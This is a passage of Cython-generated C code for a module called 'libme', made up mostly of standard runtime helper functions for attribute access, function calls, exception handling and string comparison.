 * 		try:os.mkdir("OK")
 * 		except:pass
 * try:             # <<<<<<<<<<<<<<
 * 	James().__request__()
 * except Exception as e:
 */
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    goto __pyx_L1_error;
    __pyx_L46_exception_handled:;
    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_4);
    __Pyx_XGIVEREF(__pyx_t_3);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_4, __pyx_t_3);
    __pyx_L50_try_end:;
  }

  /* "libme.pyx":1
 * #!/usr/bin/python             # <<<<<<<<<<<<<<
 * # -*- coding: utf-8
 * 
 */
  __pyx_t_8 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_8);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_test, __pyx_t_8) < 0) __PYX_ERR(0, 1, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;

  /*--- Wrapped vars code ---*/

  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_12);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_XDECREF(__pyx_t_14);
  __Pyx_XDECREF(__pyx_t_15);
  if (__pyx_m) {
    if (__pyx_d) {
      __Pyx_AddTraceback("init libme", __pyx_clineno, __pyx_lineno, __pyx_filename);
    }
    Py_CLEAR(__pyx_m);
  } else if (!PyErr_Occurred()) {
    PyErr_SetString(PyExc_ImportError, "init libme");
  }
  __pyx_L0:;
  __Pyx_RefNannyFinishContext();
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  return (__pyx_m != NULL) ? 0 : -1;
  #elif PY_MAJOR_VERSION >= 3
  return __pyx_m;
  #else
  return;
  #endif
}

/* --- Runtime support code --- */
/* Refnanny */
#if CYTHON_REFNANNY
static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname) {
    PyObject *m = NULL, *p = NULL;
    void *r = NULL;
    m = PyImport_ImportModule(modname);
    if (!m) goto end;
    p = PyObject_GetAttrString(m, "RefNannyAPI");
    if (!p) goto end;
    r = PyLong_AsVoidPtr(p);
end:
    Py_XDECREF(p);
    Py_XDECREF(m);
    return (__Pyx_RefNannyAPIStruct *)r;
}
#endif

/* PyObjectGetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_getattro))
        return tp->tp_getattro(obj, attr_name);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_getattr))
        return tp->tp_getattr(obj, PyString_AS_STRING(attr_name));
#endif
    return PyObject_GetAttr(obj, attr_name);
}
#endif

/* GetBuiltinName */
static PyObject *__Pyx_GetBuiltinName(PyObject *name) {
    PyObject* result = __Pyx_PyObject_GetAttrStr(__pyx_b, name);
    if (unlikely(!result)) {
        PyErr_Format(PyExc_NameError,
#if PY_MAJOR_VERSION >= 3
            "name '%U' is not defined", name);
#else
            "name '%.200s' is not defined", PyString_AS_STRING(name));
#endif
    }
    return result;
}

/* PyObjectSetAttrStr */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE int __Pyx_PyObject_SetAttrStr(PyObject* obj, PyObject* attr_name, PyObject* value) {
    PyTypeObject* tp = Py_TYPE(obj);
    if (likely(tp->tp_setattro))
        return tp->tp_setattro(obj, attr_name, value);
#if PY_MAJOR_VERSION < 3
    if (likely(tp->tp_setattr))
        return tp->tp_setattr(obj, PyString_AS_STRING(attr_name), value);
#endif
    return PyObject_SetAttr(obj, attr_name, value);
}
#endif

/* PyDictVersioning */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    return likely(dict) ? __PYX_GET_DICT_VERSION(dict) : 0;
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj) {
    PyObject **dictptr = NULL;
    Py_ssize_t offset = Py_TYPE(obj)->tp_dictoffset;
    if (offset) {
#if CYTHON_COMPILING_IN_CPYTHON
        dictptr = (likely(offset > 0)) ? (PyObject **) ((char *)obj + offset) : _PyObject_GetDictPtr(obj);
#else
        dictptr = _PyObject_GetDictPtr(obj);
#endif
    }
    return (dictptr && *dictptr) ? __PYX_GET_DICT_VERSION(*dictptr) : 0;
}
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version) {
    PyObject *dict = Py_TYPE(obj)->tp_dict;
    if (unlikely(!dict) || unlikely(tp_dict_version != __PYX_GET_DICT_VERSION(dict)))
        return 0;
    return obj_dict_version == __Pyx_get_object_dict_version(obj);
}
#endif

/* GetModuleGlobalName */
#if CYTHON_USE_DICT_VERSIONS
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value)
#else
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name)
#endif
{
    PyObject *result;
#if !CYTHON_AVOID_BORROWED_REFS
#if CYTHON_COMPILING_IN_CPYTHON && PY_VERSION_HEX >= 0x030500A1
    result = _PyDict_GetItem_KnownHash(__pyx_d, name, ((PyASCIIObject *) name)->hash);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    } else if (unlikely(PyErr_Occurred())) {
        return NULL;
    }
#else
    result = PyDict_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
#endif
#else
    result = PyObject_GetItem(__pyx_d, name);
    __PYX_UPDATE_DICT_CACHE(__pyx_d, result, *dict_cached_value, *dict_version)
    if (likely(result)) {
        return __Pyx_NewRef(result);
    }
    PyErr_Clear();
#endif
    return __Pyx_GetBuiltinName(name);
}

/* PyCFunctionFastCall */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject * __Pyx_PyCFunction_FastCall(PyObject *func_obj, PyObject **args, Py_ssize_t nargs) {
    PyCFunctionObject *func = (PyCFunctionObject*)func_obj;
    PyCFunction meth = PyCFunction_GET_FUNCTION(func);
    PyObject *self = PyCFunction_GET_SELF(func);
    int flags = PyCFunction_GET_FLAGS(func);
    assert(PyCFunction_Check(func));
    assert(METH_FASTCALL == (flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_KEYWORDS | METH_STACKLESS)));
    assert(nargs >= 0);
    assert(nargs == 0 || args != NULL);
    /* _PyCFunction_FastCallDict() must not be called with an exception set,
       because it may clear it (directly or indirectly) and so the
       caller loses its exception */
    assert(!PyErr_Occurred());
    if ((PY_VERSION_HEX < 0x030700A0) || unlikely(flags & METH_KEYWORDS)) {
        return (*((__Pyx_PyCFunctionFastWithKeywords)(void*)meth)) (self, args, nargs, NULL);
    } else {
        return (*((__Pyx_PyCFunctionFast)(void*)meth)) (self, args, nargs);
    }
}
#endif

/* PyFunctionFastCall */
#if CYTHON_FAST_PYCALL
static PyObject* __Pyx_PyFunction_FastCallNoKw(PyCodeObject *co, PyObject **args, Py_ssize_t na,
                                               PyObject *globals) {
    PyFrameObject *f;
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject **fastlocals;
    Py_ssize_t i;
    PyObject *result;
    assert(globals != NULL);
    /* XXX Perhaps we should create a specialized
       PyFrame_New() that doesn't take locals, but does
       take builtins without sanity checking them.
       */
    assert(tstate != NULL);
    f = PyFrame_New(tstate, co, globals, NULL);
    if (f == NULL) {
        return NULL;
    }
    fastlocals = __Pyx_PyFrame_GetLocalsplus(f);
    for (i = 0; i < na; i++) {
        Py_INCREF(*args);
        fastlocals[i] = *args++;
    }
    result = PyEval_EvalFrameEx(f,0);
    ++tstate->recursion_depth;
    Py_DECREF(f);
    --tstate->recursion_depth;
    return result;
}
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs) {
    PyCodeObject *co = (PyCodeObject *)PyFunction_GET_CODE(func);
    PyObject *globals = PyFunction_GET_GLOBALS(func);
    PyObject *argdefs = PyFunction_GET_DEFAULTS(func);
    PyObject *closure;
#if PY_MAJOR_VERSION >= 3
    PyObject *kwdefs;
#endif
    PyObject *kwtuple, **k;
    PyObject **d;
    Py_ssize_t nd;
    Py_ssize_t nk;
    PyObject *result;
    assert(kwargs == NULL || PyDict_Check(kwargs));
    nk = kwargs ? PyDict_Size(kwargs) : 0;
    if (Py_EnterRecursiveCall((char*)" while calling a Python object")) {
        return NULL;
    }
    if (
#if PY_MAJOR_VERSION >= 3
            co->co_kwonlyargcount == 0 &&
#endif
            likely(kwargs == NULL || nk == 0) &&
            co->co_flags == (CO_OPTIMIZED | CO_NEWLOCALS | CO_NOFREE)) {
        if (argdefs == NULL && co->co_argcount == nargs) {
            result = __Pyx_PyFunction_FastCallNoKw(co, args, nargs, globals);
            goto done;
        }
        else if (nargs == 0 && argdefs != NULL
                 && co->co_argcount == Py_SIZE(argdefs)) {
            /* function called with no arguments, but all parameters have
               a default value: use default values as arguments .*/
            args = &PyTuple_GET_ITEM(argdefs, 0);
            result =__Pyx_PyFunction_FastCallNoKw(co, args, Py_SIZE(argdefs), globals);
            goto done;
        }
    }
    if (kwargs != NULL) {
        Py_ssize_t pos, i;
        kwtuple = PyTuple_New(2 * nk);
        if (kwtuple == NULL) {
            result = NULL;
            goto done;
        }
        k = &PyTuple_GET_ITEM(kwtuple, 0);
        pos = i = 0;
        while (PyDict_Next(kwargs, &pos, &k[i], &k[i+1])) {
            Py_INCREF(k[i]);
            Py_INCREF(k[i+1]);
            i += 2;
        }
        nk = i / 2;
    }
    else {
        kwtuple = NULL;
        k = NULL;
    }
    closure = PyFunction_GET_CLOSURE(func);
#if PY_MAJOR_VERSION >= 3
    kwdefs = PyFunction_GET_KW_DEFAULTS(func);
#endif
    if (argdefs != NULL) {
        d = &PyTuple_GET_ITEM(argdefs, 0);
        nd = Py_SIZE(argdefs);
    }
    else {
        d = NULL;
        nd = 0;
    }
#if PY_MAJOR_VERSION >= 3
    result = PyEval_EvalCodeEx((PyObject*)co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, kwdefs, closure);
#else
    result = PyEval_EvalCodeEx(co, globals, (PyObject *)NULL,
                               args, (int)nargs,
                               k, (int)nk,
                               d, (int)nd, closure);
#endif
    Py_XDECREF(kwtuple);
done:
    Py_LeaveRecursiveCall();
    return result;
}
#endif
#endif

/* PyObjectCall */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw) {
    PyObject *result;
    ternaryfunc call = Py_TYPE(func)->tp_call;
    if (unlikely(!call))
        return PyObject_Call(func, arg, kw);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = (*call)(func, arg, kw);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCall2Args */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2) {
    PyObject *args, *result = NULL;
    #if CYTHON_FAST_PYCALL
    if (PyFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyFunction_FastCall(function, args, 2);
    }
    #endif
    #if CYTHON_FAST_PYCCALL
    if (__Pyx_PyFastCFunction_Check(function)) {
        PyObject *args[2] = {arg1, arg2};
        return __Pyx_PyCFunction_FastCall(function, args, 2);
    }
    #endif
    args = PyTuple_New(2);
    if (unlikely(!args)) goto done;
    Py_INCREF(arg1);
    PyTuple_SET_ITEM(args, 0, arg1);
    Py_INCREF(arg2);
    PyTuple_SET_ITEM(args, 1, arg2);
    Py_INCREF(function);
    result = __Pyx_PyObject_Call(function, args, NULL);
    Py_DECREF(args);
    Py_DECREF(function);
done:
    return result;
}

/* PyObjectCallMethO */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg) {
    PyObject *self, *result;
    PyCFunction cfunc;
    cfunc = PyCFunction_GET_FUNCTION(func);
    self = PyCFunction_GET_SELF(func);
    if (unlikely(Py_EnterRecursiveCall((char*)" while calling a Python object")))
        return NULL;
    result = cfunc(self, arg);
    Py_LeaveRecursiveCall();
    if (unlikely(!result) && unlikely(!PyErr_Occurred())) {
        PyErr_SetString(
            PyExc_SystemError,
            "NULL result without error in PyObject_Call");
    }
    return result;
}
#endif

/* PyObjectCallOneArg */
#if CYTHON_COMPILING_IN_CPYTHON
static PyObject* __Pyx__PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_New(1);
    if (unlikely(!args)) return NULL;
    Py_INCREF(arg);
    PyTuple_SET_ITEM(args, 0, arg);
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, &arg, 1);
    }
#endif
    if (likely(PyCFunction_Check(func))) {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_O)) {
            return __Pyx_PyObject_CallMethO(func, arg);
#if CYTHON_FAST_PYCCALL
        } else if (__Pyx_PyFastCFunction_Check(func)) {
            return __Pyx_PyCFunction_FastCall(func, &arg, 1);
#endif
        }
    }
    return __Pyx__PyObject_CallOneArg(func, arg);
}
#else
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg) {
    PyObject *result;
    PyObject *args = PyTuple_Pack(1, arg);
    if (unlikely(!args)) return NULL;
    result = __Pyx_PyObject_Call(func, args, NULL);
    Py_DECREF(args);
    return result;
}
#endif

/* PyObjectCallNoArg */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func) {
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(func)) {
        return __Pyx_PyFunction_FastCall(func, NULL, 0);
    }
#endif
#ifdef __Pyx_CyFunction_USED
    if (likely(PyCFunction_Check(func) || __Pyx_CyFunction_Check(func)))
#else
    if (likely(PyCFunction_Check(func)))
#endif
    {
        if (likely(PyCFunction_GET_FLAGS(func) & METH_NOARGS)) {
            return __Pyx_PyObject_CallMethO(func, NULL);
        }
    }
    return __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL);
}
#endif

/* DictGetItem */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key) {
    PyObject *value;
    value = PyDict_GetItemWithError(d, key);
    if (unlikely(!value)) {
        if (!PyErr_Occurred()) {
            if (unlikely(PyTuple_Check(key))) {
                PyObject* args = PyTuple_Pack(1, key);
                if (likely(args)) {
                    PyErr_SetObject(PyExc_KeyError, args);
                    Py_DECREF(args);
                }
            } else {
                PyErr_SetObject(PyExc_KeyError, key);
            }
        }
        return NULL;
    }
    Py_INCREF(value);
    return value;
}
#endif

/* GetTopmostException */
#if CYTHON_USE_EXC_INFO_STACK
static _PyErr_StackItem *
__Pyx_PyErr_GetTopmostException(PyThreadState *tstate)
{
    _PyErr_StackItem *exc_info = tstate->exc_info;
    while ((exc_info->exc_type == NULL || exc_info->exc_type == Py_None) &&
           exc_info->previous_item != NULL)
    {
        exc_info = exc_info->previous_item;
    }
    return exc_info;
}
#endif

/* SaveResetException */
#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx__ExceptionSave(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = __Pyx_PyErr_GetTopmostException(tstate);
    *type = exc_info->exc_type;
    *value = exc_info->exc_value;
    *tb = exc_info->exc_traceback;
    #else
    *type = tstate->exc_type;
    *value = tstate->exc_value;
    *tb = tstate->exc_traceback;
    #endif
    Py_XINCREF(*type);
    Py_XINCREF(*value);
    Py_XINCREF(*tb);
}
static CYTHON_INLINE void __Pyx__ExceptionReset(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    #if CYTHON_USE_EXC_INFO_STACK
    _PyErr_StackItem *exc_info = tstate->exc_info;
    tmp_type = exc_info->exc_type;
    tmp_value = exc_info->exc_value;
    tmp_tb = exc_info->exc_traceback;
    exc_info->exc_type = type;
    exc_info->exc_value = value;
    exc_info->exc_traceback = tb;
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = type;
    tstate->exc_value = value;
    tstate->exc_traceback = tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
#endif

/* PyErrExceptionMatches */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx_PyErr_ExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        if (__Pyx_PyErr_GivenExceptionMatches(exc_type, PyTuple_GET_ITEM(tuple, i))) return 1;
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_ExceptionMatchesInState(PyThreadState* tstate, PyObject* err) {
    PyObject *exc_type = tstate->curexc_type;
    if (exc_type == err) return 1;
    if (unlikely(!exc_type)) return 0;
    if (unlikely(PyTuple_Check(err)))
        return __Pyx_PyErr_ExceptionMatchesTuple(exc_type, err);
    return __Pyx_PyErr_GivenExceptionMatches(exc_type, err);
}
#endif

/* GetException */
#if CYTHON_FAST_THREAD_STATE
static int __Pyx__GetException(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb)
#else
static int __Pyx_GetException(PyObject **type, PyObject **value, PyObject **tb)
#endif
{
    PyObject *local_type, *local_value, *local_tb;
#if CYTHON_FAST_THREAD_STATE
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    local_type = tstate->curexc_type;
    local_value = tstate->curexc_value;
    local_tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
#else
    PyErr_Fetch(&local_type, &local_value, &local_tb);
#endif
    PyErr_NormalizeException(&local_type, &local_value, &local_tb);
#if CYTHON_FAST_THREAD_STATE
    if (unlikely(tstate->curexc_type))
#else
    if (unlikely(PyErr_Occurred()))
#endif
        goto bad;
    #if PY_MAJOR_VERSION >= 3
    if (local_tb) {
        if (unlikely(PyException_SetTraceback(local_value, local_tb) < 0))
            goto bad;
    }
    #endif
    Py_XINCREF(local_tb);
    Py_XINCREF(local_type);
    Py_XINCREF(local_value);
    *type = local_type;
    *value = local_value;
    *tb = local_tb;
#if CYTHON_FAST_THREAD_STATE
    #if CYTHON_USE_EXC_INFO_STACK
    {
        _PyErr_StackItem *exc_info = tstate->exc_info;
        tmp_type = exc_info->exc_type;
        tmp_value = exc_info->exc_value;
        tmp_tb = exc_info->exc_traceback;
        exc_info->exc_type = local_type;
        exc_info->exc_value = local_value;
        exc_info->exc_traceback = local_tb;
    }
    #else
    tmp_type = tstate->exc_type;
    tmp_value = tstate->exc_value;
    tmp_tb = tstate->exc_traceback;
    tstate->exc_type = local_type;
    tstate->exc_value = local_value;
    tstate->exc_traceback = local_tb;
    #endif
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
#else
    PyErr_SetExcInfo(local_type, local_value, local_tb);
#endif
    return 0;
bad:
    *type = 0;
    *value = 0;
    *tb = 0;
    Py_XDECREF(local_type);
    Py_XDECREF(local_value);
    Py_XDECREF(local_tb);
    return -1;
}

/* BytesEquals */
static CYTHON_INLINE int __Pyx_PyBytes_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
    if (s1 == s2) {
        return (equals == Py_EQ);
    } else if (PyBytes_CheckExact(s1) & PyBytes_CheckExact(s2)) {
        const char *ps1, *ps2;
        Py_ssize_t length = PyBytes_GET_SIZE(s1);
        if (length != PyBytes_GET_SIZE(s2))
            return (equals == Py_NE);
        ps1 = PyBytes_AS_STRING(s1);
        ps2 = PyBytes_AS_STRING(s2);
        if (ps1[0] != ps2[0]) {
            return (equals == Py_NE);
        } else if (length == 1) {
            return (equals == Py_EQ);
        } else {
            int result;
#if CYTHON_USE_UNICODE_INTERNALS
            Py_hash_t hash1, hash2;
            hash1 = ((PyBytesObject*)s1)->ob_shash;
            hash2 = ((PyBytesObject*)s2)->ob_shash;
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                return (equals == Py_NE);
            }
#endif
            result = memcmp(ps1, ps2, (size_t)length);
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & PyBytes_CheckExact(s2)) {
        return (equals == Py_NE);
    } else if ((s2 == Py_None) & PyBytes_CheckExact(s1)) {
        return (equals == Py_NE);
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
#endif
}

/* UnicodeEquals */
static CYTHON_INLINE int __Pyx_PyUnicode_Equals(PyObject* s1, PyObject* s2, int equals) {
#if CYTHON_COMPILING_IN_PYPY
    return PyObject_RichCompareBool(s1, s2, equals);
#else
#if PY_MAJOR_VERSION < 3
    PyObject* owned_ref = NULL;
#endif
    int s1_is_unicode, s2_is_unicode;
    if (s1 == s2) {
        goto return_eq;
    }
    s1_is_unicode = PyUnicode_CheckExact(s1);
    s2_is_unicode = PyUnicode_CheckExact(s2);
#if PY_MAJOR_VERSION < 3
    if ((s1_is_unicode & (!s2_is_unicode)) && PyString_CheckExact(s2)) {
        owned_ref = PyUnicode_FromObject(s2);
        if (unlikely(!owned_ref))
            return -1;
        s2 = owned_ref;
        s2_is_unicode = 1;
    } else if ((s2_is_unicode & (!s1_is_unicode)) && PyString_CheckExact(s1)) {
        owned_ref = PyUnicode_FromObject(s1);
        if (unlikely(!owned_ref))
            return -1;
        s1 = owned_ref;
        s1_is_unicode = 1;
    } else if (((!s2_is_unicode) & (!s1_is_unicode))) {
        return __Pyx_PyBytes_Equals(s1, s2, equals);
    }
#endif
    if (s1_is_unicode & s2_is_unicode) {
        Py_ssize_t length;
        int kind;
        void *data1, *data2;
        if (unlikely(__Pyx_PyUnicode_READY(s1) < 0) || unlikely(__Pyx_PyUnicode_READY(s2) < 0))
            return -1;
        length = __Pyx_PyUnicode_GET_LENGTH(s1);
        if (length != __Pyx_PyUnicode_GET_LENGTH(s2)) {
            goto return_ne;
        }
#if CYTHON_USE_UNICODE_INTERNALS
        {
            Py_hash_t hash1, hash2;
        #if CYTHON_PEP393_ENABLED
            hash1 = ((PyASCIIObject*)s1)->hash;
            hash2 = ((PyASCIIObject*)s2)->hash;
        #else
            hash1 = ((PyUnicodeObject*)s1)->hash;
            hash2 = ((PyUnicodeObject*)s2)->hash;
        #endif
            if (hash1 != hash2 && hash1 != -1 && hash2 != -1) {
                goto return_ne;
            }
        }
#endif
        kind = __Pyx_PyUnicode_KIND(s1);
        if (kind != __Pyx_PyUnicode_KIND(s2)) {
            goto return_ne;
        }
        data1 = __Pyx_PyUnicode_DATA(s1);
        data2 = __Pyx_PyUnicode_DATA(s2);
        if (__Pyx_PyUnicode_READ(kind, data1, 0) != __Pyx_PyUnicode_READ(kind, data2, 0)) {
            goto return_ne;
        } else if (length == 1) {
            goto return_eq;
        } else {
            int result = memcmp(data1, data2, (size_t)(length * kind));
            #if PY_MAJOR_VERSION < 3
            Py_XDECREF(owned_ref);
            #endif
            return (equals == Py_EQ) ? (result == 0) : (result != 0);
        }
    } else if ((s1 == Py_None) & s2_is_unicode) {
        goto return_ne;
    } else if ((s2 == Py_None) & s1_is_unicode) {
        goto return_ne;
    } else {
        int result;
        PyObject* py_result = PyObject_RichCompare(s1, s2, equals);
        #if PY_MAJOR_VERSION < 3
        Py_XDECREF(owned_ref);
        #endif
        if (!py_result)
            return -1;
        result = __Pyx_PyObject_IsTrue(py_result);
        Py_DECREF(py_result);
        return result;
    }
return_eq:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_EQ);
return_ne:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(owned_ref);
    #endif
    return (equals == Py_NE);
#endif
}

/* PyObjectGetMethod */
static int __Pyx_PyObject_GetMethod(PyObject *obj, PyObject *name, PyObject **method) {
    PyObject *attr;
#if CYTHON_UNPACK_METHODS && CYTHON_COMPILING_IN_CPYTHON && CYTHON_USE_PYTYPE_LOOKUP
    PyTypeObject *tp = Py_TYPE(obj);
    PyObject *descr;
    descrgetfunc f = NULL;
    PyObject **dictptr, *dict;
    int meth_found = 0;
    assert (*method == NULL);
    if (unlikely(tp->tp_getattro != PyObject_GenericGetAttr)) {
        attr = __Pyx_PyObject_GetAttrStr(obj, name);
        goto try_unpack;
    }
    if (unlikely(tp->tp_dict == NULL) && unlikely(PyType_Ready(tp) < 0)) {
        return 0;
    }
    descr = _PyType_Lookup(tp, name);
    if (likely(descr != NULL)) {
        Py_INCREF(descr);
#if PY_MAJOR_VERSION >= 3
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr) || (Py_TYPE(descr) == &PyMethodDescr_Type)))
        #endif
#else
        #ifdef __Pyx_CyFunction_USED
        if (likely(PyFunction_Check(descr) || __Pyx_CyFunction_Check(descr)))
        #else
        if (likely(PyFunction_Check(descr)))
        #endif
#endif
        {
            meth_found = 1;
        } else {
            f = Py_TYPE(descr)->tp_descr_get;
            if (f != NULL && PyDescr_IsData(descr)) {
                attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
                Py_DECREF(descr);
                goto try_unpack;
            }
        }
    }
    dictptr = _PyObject_GetDictPtr(obj);
    if (dictptr != NULL && (dict = *dictptr) != NULL) {
        Py_INCREF(dict);
        attr = __Pyx_PyDict_GetItemStr(dict, name);
        if (attr != NULL) {
            Py_INCREF(attr);
            Py_DECREF(dict);
            Py_XDECREF(descr);
            goto try_unpack;
        }
        Py_DECREF(dict);
    }
    if (meth_found) {
        *method = descr;
        return 1;
    }
    if (f != NULL) {
        attr = f(descr, obj, (PyObject *)Py_TYPE(obj));
        Py_DECREF(descr);
        goto try_unpack;
    }
    if (descr != NULL) {
        *method = descr;
        return 0;
    }
    PyErr_Format(PyExc_AttributeError,
#if PY_MAJOR_VERSION >= 3
                 "'%.50s' object has no attribute '%U'",
                 tp->tp_name, name);
#else
                 "'%.50s' object has no attribute '%.400s'",
                 tp->tp_name, PyString_AS_STRING(name));
#endif
    return 0;
#else
    attr = __Pyx_PyObject_GetAttrStr(obj, name);
    goto try_unpack;
#endif
try_unpack:
#if CYTHON_UNPACK_METHODS
    if (likely(attr) && PyMethod_Check(attr) && likely(PyMethod_GET_SELF(attr) == obj)) {
        PyObject *function = PyMethod_GET_FUNCTION(attr);
        Py_INCREF(function);
        Py_DECREF(attr);
        *method = function;
        return 1;
    }
#endif
    *method = attr;
    return 0;
}

/* PyObjectCallMethod1 */
static PyObject* __Pyx__PyObject_CallMethod1(PyObject* method, PyObject* arg) {
    PyObject *result = __Pyx_PyObject_CallOneArg(method, arg);
    Py_DECREF(method);
    return result;
}
static PyObject* __Pyx_PyObject_CallMethod1(PyObject* obj, PyObject* method_name, PyObject* arg) {
    PyObject *method = NULL, *result;
    int is_method = __Pyx_PyObject_GetMethod(obj, method_name, &method);
    if (likely(is_method)) {
        result = __Pyx_PyObject_Call2Args(method, obj, arg);
        Py_DECREF(method);
        return result;
    }
    if (unlikely(!method)) return NULL;
    return __Pyx__PyObject_CallMethod1(method, arg);
}

/* append */
static CYTHON_INLINE int __Pyx_PyObject_Append(PyObject* L, PyObject* x) {
    if (likely(PyList_CheckExact(L))) {
        if (unlikely(__Pyx_PyList_Append(L, x) < 0)) return -1;
    } else {
        PyObject* retval = __Pyx_PyObject_CallMethod1(L, __pyx_n_s_append, x);
        if (unlikely(!retval))
            return -1;
        Py_DECREF(retval);
    }
    return 0;
}

/* PyErrFetchRestore */
